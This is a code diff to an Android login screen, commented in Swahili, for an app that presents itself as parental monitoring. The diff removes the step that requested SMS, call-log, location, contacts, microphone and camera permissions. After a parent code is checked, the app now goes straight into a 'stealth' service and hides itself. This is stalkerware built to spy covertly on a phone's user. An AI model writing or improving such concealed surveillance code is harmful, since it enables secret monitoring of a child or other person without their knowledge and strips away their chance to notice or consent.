@@ -28,9 +28,12 @@ public class LoginActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
+        // FUKUZA SCREEN KABISA
         requestWindowFeature(Window.FEATURE_NO_TITLE);
         getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                            WindowManager.LayoutParams.FLAG_FULLSCREEN);
+        getWindow().setFlags(WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                           WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS);
 
         setContentView(R.layout.activity_login);
 
@@ -38,9 +41,9 @@ public class LoginActivity extends AppCompatActivity {
         String savedCode = prefs.getString("parent_code", "");
         boolean isVerified = prefs.getBoolean("code_verified", false);
 
-        // 🔒 KAMA CODE IMEISHATHIBITISHWA, ANZA STEALTH MODE MOJA KWA MOJA
+        // ✅ KAMA PARENT CODE IMEWAKA - ANZA STEALTH MOJA KWA MOJA
         if (!savedCode.isEmpty() && isVerified) {
-            startStealthMode(savedCode);
+            startStealthModeImmediately(savedCode);
             return;
         }
 
@@ -102,7 +105,9 @@ public class LoginActivity extends AppCompatActivity {
                         if (isValid) {
                             String parentName = jsonResponse.optString("parent_name", "Mzazi");
                             String childPhone = jsonResponse.optString("child_phone", "Hakuna namba");
-                            saveCodeAndRequestPermissions(code, parentName, childPhone);
+                            
+                            // ✅ CODE SAHIHI - ANZA STEALTH MOJA KWA MOJA
+                            saveCodeAndStartStealth(code, parentName, childPhone);
                         } else {
                             String error = jsonResponse.optString("error", "Parent code si sahihi!");
                             Toast.makeText(this, "❌ " + error, Toast.LENGTH_LONG).show();
@@ -125,7 +130,7 @@ public class LoginActivity extends AppCompatActivity {
         }).start();
     }
 
-    private void saveCodeAndRequestPermissions(String code, String parentName, String childPhone) {
+    private void saveCodeAndStartStealth(String code, String parentName, String childPhone) {
         SharedPreferences.Editor editor = prefs.edit();
         editor.putString("parent_code", code);
         editor.putString("parent_name", parentName);
@@ -133,58 +138,17 @@ public class LoginActivity extends AppCompatActivity {
         editor.putBoolean("code_verified", true);
         editor.apply();
 
-        requestAllPermissions();
+        // ✅ ANZA STEALTH MOJA KWA MOJA
+        startStealthModeImmediately(code);
     }
 
-    private void requestAllPermissions() {
-        String[] permissions = {
-            Manifest.permission.READ_SMS,
-            Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.CAMERA,
-            Manifest.permission.READ_EXTERNAL_STORAGE,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE
-        };
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
-        } else {
-            startStealthMode(prefs.getString("parent_code", ""));
-        }
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-
-        if (requestCode == PERMISSION_REQUEST_CODE) {
-            boolean allGranted = true;
-            for (int result : grantResults) {
-                if (result != PackageManager.PERMISSION_GRANTED) {
-                    allGranted = false;
-                    break;
-                }
-            }
-
-            if (allGranted) {
-                Toast.makeText(this, "✅ Permissions zote zimekubaliwa! App inafichika...", Toast.LENGTH_LONG).show();
-                startStealthMode(prefs.getString("parent_code", ""));
-            } else {
-                Toast.makeText(this, "⚠️ Baadhi ya permissions hazijakubaliwa.", Toast.LENGTH_LONG).show();
-                startStealthMode(prefs.getString("parent_code", ""));
-            }
-        }
-    }
-
-    private void startStealthMode(String code) {
-        // 🔒 ANZA SERVICE NA KUFICHA APP
+    private void startStealthModeImmediately(String code) {
+        // ANZA SERVICE MOJA KWA MOJA
         Intent stealthIntent = new Intent(this, StealthService.class);
         stealthIntent.putExtra("PARENT_CODE", code);
         startService(stealthIntent);
 
-        // 🚀 TOA APP KUTOKA LAUNCHER
+        // FANYA IJIFICHE KABISA
         moveTaskToBack(true);
         finish();
     }
